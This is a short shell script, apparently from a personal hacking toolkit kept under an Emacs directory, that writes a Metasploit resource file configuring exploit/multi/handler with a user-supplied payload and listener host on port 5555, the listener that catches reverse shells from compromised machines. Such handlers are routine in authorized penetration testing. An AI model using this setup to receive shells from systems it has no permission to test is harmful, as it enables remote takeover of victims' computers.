PAYLOAD="$1"
LHOST="$2"
FILE="${HOME}/.emacs.d/sh4hack/msf.rc" 

if [ -z "$PAYLOAD" ] || [ -z "$LHOST" ]; then
    echo "Payload and lhost are required.";
    echo "Arg1: Payload, Arg2: Lhost";
    exit 1;
fi

cat > $FILE <<- EOM
use exploit/multi/handler
set payload $PAYLOAD
set lhost $LHOST
set lport 5555
run
EOM
